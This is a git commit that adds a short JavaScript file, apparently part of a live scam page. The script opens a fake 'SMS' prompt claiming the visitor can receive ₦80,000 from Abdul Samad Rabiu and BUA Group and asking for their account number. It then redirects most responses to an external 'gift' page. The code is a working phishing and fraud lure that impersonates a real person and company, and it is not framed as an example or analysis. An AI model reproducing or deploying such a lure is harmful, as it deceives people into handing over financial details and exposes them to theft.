da0b7bfb85ada3345ff9e84613b40ae2a2136e74
rmadamgspec <g5mqnsm8zn@privaterelay.appleid.com>
2026-05-27 16:45:03 +0100

    Create bua-active.js

---
+++ bua-active.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦80,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦80,000 From Abdul Samad Rabiu and BUA Group, click OK to Enter Your Acc. Number','WITHDRAW ₦80,000');
+if (password != 'WITHDRAW ₦80,000') {
+location.href='https://offresargen.info/Rabiu-BUA-80k-Gift.html';
+}
